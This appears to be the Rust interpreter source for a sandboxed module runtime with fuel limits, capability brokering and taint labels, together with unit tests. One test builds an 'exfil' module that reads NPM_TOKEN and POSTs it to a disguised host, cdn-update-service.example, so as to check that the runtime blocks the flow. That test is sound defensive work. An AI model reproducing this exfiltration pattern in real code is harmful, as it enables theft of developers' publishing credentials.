use omc_cap::{CapabilityBroker, Policy, Trap};
use omc_format::{CapOp, CellId, Function, Module, Op, TrapCode, Value};
use omc_taint::{Label, Labeled};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fuel(u64);

impl Fuel {
    pub fn new(units: u64) -> Self {
        Self(units)
    }

    fn consume(&mut self, units: u64) -> Result<(), Trap> {
        if self.0 < units {
            return Err(Trap::new(TrapCode::FuelExhausted, "cell exhausted fuel"));
        }
        self.0 -= units;
        Ok(())
    }
}

#[derive(Debug, Clone)]
pub struct Cell {
    pub id: CellId,
    pub module: Module,
    pub policy: Policy,
    pub fuel: Fuel,
}

impl Cell {
    pub fn new(id: CellId, module: Module, policy: Policy) -> Self {
        Self {
            id,
            module,
            policy,
            fuel: Fuel::new(10_000),
        }
    }
}

pub fn run_cell(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    let function = cell
        .module
        .entry()
        .ok_or_else(|| Trap::new(TrapCode::InvalidFunction, "module has no entry function"))?
        .clone();

    run_function(cell, broker, &function, args)
}

fn run_function(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    function: &Function,
    args: Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    let mut stack = Vec::<Labeled<Value>>::new();
    let mut locals = vec![Labeled::public(Value::Unit); function.locals as usize];

    for op in &function.code {
        cell.fuel.consume(1)?;

        match op {
            Op::Const(value) => stack.push(Labeled::public(value.clone())),
            Op::LoadArg(index) => {
                let value = args.get(*index as usize).cloned().ok_or_else(|| {
                    Trap::new(TrapCode::StackUnderflow, format!("missing arg {index}"))
                })?;
                stack.push(value);
            }
            Op::StoreLocal(id) => {
                let value = pop(&mut stack)?;
                let local = locals.get_mut(*id as usize).ok_or_else(|| {
                    Trap::new(TrapCode::InvalidLocal, format!("invalid local {id}"))
                })?;
                *local = value;
            }
            Op::LoadLocal(id) => {
                let value = locals.get(*id as usize).cloned().ok_or_else(|| {
                    Trap::new(TrapCode::InvalidLocal, format!("invalid local {id}"))
                })?;
                stack.push(value);
            }
            Op::Add => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(add(left, right)?);
            }
            Op::Sub => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                stack.push(sub(left, right)?);
            }
            Op::Eq => {
                let right = pop(&mut stack)?;
                let left = pop(&mut stack)?;
                let label = left.label.join(right.label);
                stack.push(Labeled::new(Value::Bool(left.value == right.value), label));
            }
            Op::Len => {
                let value = pop(&mut stack)?;
                let len = match value.value {
                    Value::String(value) => value.len(),
                    Value::Array(value) => value.len(),
                    other => {
                        return Err(Trap::type_error(format!(
                            "len expected string or array, got {}",
                            other.type_name()
                        )))
                    }
                };
                stack.push(Labeled::new(Value::Int(len as i64), value.label));
            }
            Op::Slice => {
                let end = pop(&mut stack)?;
                let start = pop(&mut stack)?;
                let value = pop(&mut stack)?;
                stack.push(slice(value, start, end)?);
            }
            Op::JsonParse => {
                let value = pop(&mut stack)?;
                stack.push(json_parse(value)?);
            }
            Op::JsonStringify => {
                let value = pop(&mut stack)?;
                stack.push(json_stringify(value)?);
            }
            Op::CallLocal(id) => {
                let callee = cell
                    .module
                    .function(*id)
                    .ok_or_else(|| Trap::new(TrapCode::InvalidFunction, "unknown function"))?
                    .clone();
                let mut call_args = Vec::new();
                for _ in 0..callee.args {
                    call_args.push(pop(&mut stack)?);
                }
                call_args.reverse();
                let result = run_function(cell, broker, &callee, call_args)?;
                stack.push(result);
            }
            Op::CallImport(_) => {
                return Err(Trap::new(
                    TrapCode::HostError,
                    "imports must be linked through capability calls",
                ))
            }
            Op::Cap(cap) => {
                let result = execute_cap(cell, broker, cap, &mut stack)?;
                stack.push(result);
            }
            Op::Return => return Ok(stack.pop().unwrap_or_else(|| Labeled::public(Value::Unit))),
            Op::Trap(code) => {
                return Err(Trap::new(code.clone(), "explicit OMC trap"));
            }
        }
    }

    Ok(Labeled::public(Value::Unit))
}

fn execute_cap(
    cell: &mut Cell,
    broker: &mut dyn CapabilityBroker,
    cap: &CapOp,
    stack: &mut Vec<Labeled<Value>>,
) -> Result<Labeled<Value>, Trap> {
    match cap {
        CapOp::EnvRead { name } => broker.read_env(cell.id, &cell.policy, name),
        CapOp::FsRead { path } => broker.read_file(cell.id, &cell.policy, path),
        CapOp::FsWrite {
            path,
            value_from_stack,
        } => {
            let value = if *value_from_stack {
                pop(stack)?
            } else {
                Labeled::public(Value::Unit)
            };
            broker.write_file(cell.id, &cell.policy, path, value)
        }
        CapOp::HttpRequest { request } => {
            let body = if request.body_from_stack {
                pop(stack)?
            } else {
                Labeled::public(Value::Unit)
            };
            broker.http_request(cell.id, &cell.policy, request, body)
        }
        CapOp::DnsLookup { host } => Ok(Labeled::new(
            Value::String(host.clone()),
            Label::Network(host.clone()),
        )),
        CapOp::TimeNow => Ok(Labeled::public(Value::Int(0))),
        CapOp::RandomBytes { len } => Ok(Labeled::public(Value::Array(vec![Value::Int(0); *len]))),
        CapOp::ProcSpawn { command, args } => {
            broker.spawn_process(cell.id, &cell.policy, command, args)?;
            unreachable!("spawn_process returns Never on success")
        }
        CapOp::DynamicEval { .. } => Err(Trap::denied("dynamic eval denied by runtime")),
    }
}

fn pop(stack: &mut Vec<Labeled<Value>>) -> Result<Labeled<Value>, Trap> {
    stack
        .pop()
        .ok_or_else(|| Trap::new(TrapCode::StackUnderflow, "stack underflow"))
}

fn add(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(left), Value::Int(right)) => Ok(Labeled::new(Value::Int(left + right), label)),
        (Value::String(left), Value::String(right)) => {
            Ok(Labeled::new(Value::String(format!("{left}{right}")), label))
        }
        (left, right) => Err(Trap::type_error(format!(
            "add expected int+int or string+string, got {}+{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

fn sub(left: Labeled<Value>, right: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = left.label.join(right.label);
    match (left.value, right.value) {
        (Value::Int(left), Value::Int(right)) => Ok(Labeled::new(Value::Int(left - right), label)),
        (left, right) => Err(Trap::type_error(format!(
            "sub expected int-int, got {}-{}",
            left.type_name(),
            right.type_name()
        ))),
    }
}

fn slice(
    value: Labeled<Value>,
    start: Labeled<Value>,
    end: Labeled<Value>,
) -> Result<Labeled<Value>, Trap> {
    let label = value.label.join(start.label).join(end.label);
    let start = expect_int("slice start", start.value)?;
    let end = expect_int("slice end", end.value)?;
    match value.value {
        Value::String(value) => {
            let chars = value.chars().collect::<Vec<_>>();
            let (start, end) = slice_bounds(start, end, chars.len());
            Ok(Labeled::new(
                Value::String(chars[start..end].iter().collect()),
                label,
            ))
        }
        Value::Array(values) => {
            let (start, end) = slice_bounds(start, end, values.len());
            Ok(Labeled::new(
                Value::Array(values[start..end].to_vec()),
                label,
            ))
        }
        other => Err(Trap::type_error(format!(
            "slice expected string or array, got {}",
            other.type_name()
        ))),
    }
}

fn expect_int(context: &str, value: Value) -> Result<i64, Trap> {
    match value {
        Value::Int(value) => Ok(value),
        other => Err(Trap::type_error(format!(
            "{context} expected int, got {}",
            other.type_name()
        ))),
    }
}

fn slice_bounds(start: i64, end: i64, len: usize) -> (usize, usize) {
    let start = slice_index(start, len);
    let end = slice_index(end, len);
    if end < start {
        (start, start)
    } else {
        (start, end)
    }
}

fn slice_index(index: i64, len: usize) -> usize {
    let len = len as i64;
    let index = if index < 0 { len + index } else { index };
    index.clamp(0, len) as usize
}

fn json_parse(value: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let Value::String(source) = value.value else {
        return Err(Trap::type_error("json_parse expected string"));
    };
    let parsed = serde_json::from_str::<serde_json::Value>(&source)
        .map_err(|error| Trap::type_error(format!("json_parse failed: {error}")))?;
    Ok(Labeled::new(json_to_omc_value(parsed)?, value.label))
}

fn json_stringify(value: Labeled<Value>) -> Result<Labeled<Value>, Trap> {
    let label = value.label;
    let json = omc_value_to_json(value.value);
    let serialized = serde_json::to_string(&json)
        .map_err(|error| Trap::type_error(format!("json_stringify failed: {error}")))?;
    Ok(Labeled::new(Value::String(serialized), label))
}

fn json_to_omc_value(value: serde_json::Value) -> Result<Value, Trap> {
    Ok(match value {
        serde_json::Value::Null => Value::Unit,
        serde_json::Value::Bool(value) => Value::Bool(value),
        serde_json::Value::Number(value) => Value::Int(value.as_i64().ok_or_else(|| {
            Trap::type_error(format!("json_parse unsupported non-integer number {value}"))
        })?),
        serde_json::Value::String(value) => Value::String(value),
        serde_json::Value::Array(values) => Value::Array(
            values
                .into_iter()
                .map(json_to_omc_value)
                .collect::<Result<Vec<_>, _>>()?,
        ),
        serde_json::Value::Object(values) => Value::Map(
            values
                .into_iter()
                .map(|(key, value)| json_to_omc_value(value).map(|value| (key, value)))
                .collect::<Result<Vec<_>, _>>()?,
        ),
    })
}

fn omc_value_to_json(value: Value) -> serde_json::Value {
    match value {
        Value::Unit => serde_json::Value::Null,
        Value::Bool(value) => serde_json::Value::Bool(value),
        Value::Int(value) => serde_json::Value::Number(value.into()),
        Value::String(value) => serde_json::Value::String(value),
        Value::Array(values) => {
            serde_json::Value::Array(values.into_iter().map(omc_value_to_json).collect())
        }
        Value::Map(values) => serde_json::Value::Object(
            values
                .into_iter()
                .map(|(key, value)| (key, omc_value_to_json(value)))
                .collect(),
        ),
    }
}

#[cfg(test)]
mod tests {
    use omc_cap::{Capability, MemoryBroker, Policy};
    use omc_format::{BehaviorType, CapOp, Function, HttpRequest, Module, Op};

    use super::*;

    #[test]
    fn pure_add_runs_without_broker_access() {
        let module = Module {
            id: "test:add".to_owned(),
            package: "add".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "add",
                2,
                vec![Op::LoadArg(0), Op::LoadArg(1), Op::Add, Op::Return],
            )],
        };
        let mut cell = Cell::new(1, module, Policy::pure());
        let mut broker = MemoryBroker::new();
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![
                Labeled::public(Value::Int(2)),
                Labeled::public(Value::Int(3)),
            ],
        )
        .unwrap();

        assert_eq!(result.value, Value::Int(5));
        assert_eq!(result.label, Label::Public);
    }

    #[test]
    fn slice_runs_for_strings_and_arrays() {
        let string_module = Module {
            id: "test:slice-string".to_owned(),
            package: "slice-string".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "slice",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::Const(Value::Int(1)),
                    Op::Const(Value::Int(-1)),
                    Op::Slice,
                    Op::Return,
                ],
            )],
        };
        let mut cell = Cell::new(1, string_module, Policy::pure());
        let mut broker = MemoryBroker::new();
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![Labeled::new(
                Value::String("microcode".to_owned()),
                Label::Env("TOKEN".to_owned()),
            )],
        )
        .unwrap();
        assert_eq!(result.value, Value::String("icrocod".to_owned()));
        assert_eq!(result.label, Label::Env("TOKEN".to_owned()));

        let array_module = Module {
            id: "test:slice-array".to_owned(),
            package: "slice-array".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "slice",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::Const(Value::Int(1)),
                    Op::Const(Value::Int(3)),
                    Op::Slice,
                    Op::Return,
                ],
            )],
        };
        let mut cell = Cell::new(2, array_module, Policy::pure());
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![Labeled::public(Value::Array(vec![
                Value::Int(1),
                Value::Int(2),
                Value::Int(3),
                Value::Int(4),
            ]))],
        )
        .unwrap();
        assert_eq!(
            result.value,
            Value::Array(vec![Value::Int(2), Value::Int(3)])
        );
        assert_eq!(result.label, Label::Public);
    }

    #[test]
    fn json_parse_and_stringify_preserve_labels() {
        let parse_module = Module {
            id: "test:json-parse".to_owned(),
            package: "json-parse".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "parse",
                1,
                vec![Op::LoadArg(0), Op::JsonParse, Op::Return],
            )],
        };
        let mut cell = Cell::new(1, parse_module, Policy::pure());
        let mut broker = MemoryBroker::new();
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![Labeled::new(
                Value::String(r#"[1,"two",null,true]"#.to_owned()),
                Label::File("config.json".to_owned()),
            )],
        )
        .unwrap();
        assert_eq!(
            result.value,
            Value::Array(vec![
                Value::Int(1),
                Value::String("two".to_owned()),
                Value::Unit,
                Value::Bool(true)
            ])
        );
        assert_eq!(result.label, Label::File("config.json".to_owned()));

        let stringify_module = Module {
            id: "test:json-stringify".to_owned(),
            package: "json-stringify".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "stringify",
                1,
                vec![Op::LoadArg(0), Op::JsonStringify, Op::Return],
            )],
        };
        let mut cell = Cell::new(2, stringify_module, Policy::pure());
        let result = run_cell(
            &mut cell,
            &mut broker,
            vec![Labeled::new(
                Value::Map(vec![
                    ("name".to_owned(), Value::String("omc".to_owned())),
                    ("enabled".to_owned(), Value::Bool(true)),
                ]),
                Label::Env("CONFIG_JSON".to_owned()),
            )],
        )
        .unwrap();
        let Value::String(json) = result.value else {
            panic!("json_stringify returned non-string value");
        };
        assert_eq!(
            serde_json::from_str::<serde_json::Value>(&json).unwrap(),
            serde_json::json!({"name": "omc", "enabled": true})
        );
        assert_eq!(result.label, Label::Env("CONFIG_JSON".to_owned()));
    }

    #[test]
    fn runtime_traps_illegal_secret_flow() {
        let module = Module {
            id: "test:exfil".to_owned(),
            package: "exfil".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::HostCapability,
            functions: vec![Function::new(
                0,
                "exfil",
                0,
                vec![
                    Op::Cap(CapOp::EnvRead {
                        name: "NPM_TOKEN".to_owned(),
                    }),
                    Op::Cap(CapOp::HttpRequest {
                        request: HttpRequest::post(
                            "https://cdn-update-service.example/a",
                            "cdn-update-service.example",
                        ),
                    }),
                    Op::Return,
                ],
            )],
        };
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost(
                "cdn-update-service.example".to_owned(),
            ));
        let mut cell = Cell::new(1, module, policy);
        let mut broker = MemoryBroker::new().with_env("NPM_TOKEN", "secret");

        let err = run_cell(&mut cell, &mut broker, vec![]).unwrap_err();
        assert!(err.message.contains("env:NPM_TOKEN may not flow"));
    }
}
